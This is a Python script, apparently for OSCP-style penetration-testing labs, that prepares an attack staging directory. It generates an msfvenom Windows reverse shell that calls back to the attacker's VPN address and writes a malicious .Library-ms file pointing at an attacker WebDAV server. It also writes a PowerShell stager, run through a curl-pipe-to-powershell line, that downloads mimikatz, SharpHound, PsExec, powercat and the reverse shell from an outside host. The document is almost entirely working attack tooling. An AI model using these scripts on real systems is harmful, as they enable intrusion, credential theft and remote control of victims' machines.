### Création d'un reverse_shell
import netifaces, os

LAB_DIR_NAME = "name"
LAB_SCRIPT_DIR = "script"
LAB_WEBDAV_DIR = "webdav"

IP_VPN = netifaces.ifaddresses('tun0')[netifaces.AF_INET][0]['addr']

def content_webdav():
    line = '<?xml version="1.0" encoding="UTF-8"?>\n'
    line += '<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">\n'
    line += '<name>@windows.storage.dll,-34582</name>\n'
    line += '<version>6</version>\n'
    line += '<isLibraryPinned>true</isLibraryPinned>\n'
    line += '<iconReference>imageres.dll,-1003</iconReference>\n'
    line += '<templateInfo>\n'
    line += '<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>\n'
    line += '</templateInfo>\n'
    line += '<searchConnectorDescriptionList>\n'
    line += '<searchConnectorDescription>\n'
    line += '<isDefaultSaveLocation>true</isDefaultSaveLocation>\n'
    line += '<isSupported>false</isSupported>\n'
    line += '<simpleLocation>\n'
    line += '<url>http://'+IP_VPN+'</url>\n'
    line += '</simpleLocation>\n'
    line += '</searchConnectorDescription>\n'
    line += '</searchConnectorDescriptionList>\n'
    line += '</libraryDescription>'
    return line

def init_windows():
    line = '# curl.exe http://192.168.144.36/init_windows.ps1 | powershell.exe -\n'
    line += '$IP = "192.168.144.36"\n\n'
    line += 'Write-Host "Starting"\n'
    line += 'New-Item -Path "C:\" -Name "tmp" -ItemType Directory > $null 2>&1\n'
    line += 'Write-Host "New Folder C:\tmp"\n\n'
    line += 'Write-Host "Downloading All file"\n'
    line += 'Invoke-WebRequest -Uri "http://$IP/mimikatz.exe" -OutFile "C:\tmp\mimikatz.exe"\n'
    line += 'Invoke-WebRequest -Uri "http://$IP/SharpHound.ps1" -OutFile "C:\tmp\SharpHound.ps1"\n'
    line += 'Invoke-WebRequest -Uri "http://$IP/winPeas.ps1" -OutFile "C:\tmp\winPeas.ps1"\n'
    line += 'Invoke-WebRequest -Uri "http://$IP/reverse_shell.exe" -OutFile "C:\tmp\reverse_shell.exe"\n'
    line += 'Invoke-WebRequest -Uri "http://$IP/PsExec64.exe" -OutFile "C:\tmp\PsExec64.exe"\n'
    line += 'Invoke-WebRequest -Uri "http://$IP/powercat.ps1" -OutFile "C:\tmp\powercat.ps1"'
return line

print("[~] MKDIR script")
os.mkdir(LAB_SCRIPT_DIR)
print("[~] MKDIR webdav")
os.mkdir(LAB_WEBDAV_DIR)

print("#################")
print("#    CP SCRIPT  #")
print("#################")
print("[+] CP Mimikatz")
os.system("cp /home/audric/Desktop/OSCP/script/mimikatz.exe "+LAB_SCRIPT_DIR+"/mimikatz.exe")
print("[+] CP linepeas")
os.system("cp /home/audric/Desktop/OSCP/script/linepeas.sh "+LAB_SCRIPT_DIR+"/linepeas.sh")
print("[+] CP SharpHound")
os.system("cp /home/audric/Desktop/OSCP/script/SharpHound.ps1 "+LAB_SCRIPT_DIR+"/SharpHound.ps1")
print("[+] CP PowerView.ps1")
os.system("cp /home/audric/Desktop/OSCP/script/PowerView.ps1 "+LAB_SCRIPT_DIR+"/PowerView.ps1")
print("[+] CP PsExec64.exe")
os.system("cp /home/audric/Desktop/OSCP/script/PsExec64.exe "+LAB_SCRIPT_DIR+"/PsExec64.exe")
print("[+] CP winPeas.ps1")
os.system("cp /home/audric/Desktop/OSCP/script/winPeas.ps1 "+LAB_SCRIPT_DIR+"/winPeas.ps1")
print("[+] CP powercat.ps1")
os.system("cp /home/audric/Desktop/OSCP/script/powercat.ps1 "+LAB_SCRIPT_DIR+"/powercat.ps1")
print("[+] CP powercat.ps1")
os.system("cp /home/audric/Desktop/OSCP/script/powershell_2_base64_reverse_shell.ps1 "+LAB_SCRIPT_DIR+"/powershell_2_base64_reverse_shell.ps1")

print("[+] Creating revershell for port 443")
os.system("msfvenom -p windows/shell_reverse_tcp LHOST="+str(IP_VPN)+" LPORT=443 -f exe > "+LAB_SCRIPT_DIR+"/reverse_shell.exe")

print("#################")
print("#  WEBDAV FILE  #")
print("#################")
file= open(LAB_WEBDAV_DIR+"/config.Library-ms","a")
file.write(content_webdav())
file.close()

print("#################")
print("#  INIT WINDOW  #")
print("#################")
file= open(LAB_WEBDAV_DIR+"/init_windows.ps1","a")
file.write(init_windows())
file.close()